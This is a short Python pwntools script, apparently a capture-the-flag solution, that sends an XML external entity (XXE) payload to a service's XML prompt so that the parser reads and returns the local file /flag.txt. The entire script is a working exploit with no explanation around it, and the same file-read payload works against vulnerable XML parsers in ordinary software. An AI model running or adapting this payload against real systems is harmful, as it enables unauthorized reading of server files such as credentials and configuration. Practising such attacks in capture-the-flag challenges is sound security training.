#!/usr/bin/env python3

from pwn import *

io = start()
io.recvuntil("Please enter your XML here:\n")

payload = (
"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ 
      <!ENTITY xxe SYSTEM "file:///flag.txt">
      ] >
<site>
    <vuln>&xxe;</vuln>
    </site>
"""
).replace("\n", "")
io.sendline(payload)

io.interactive()

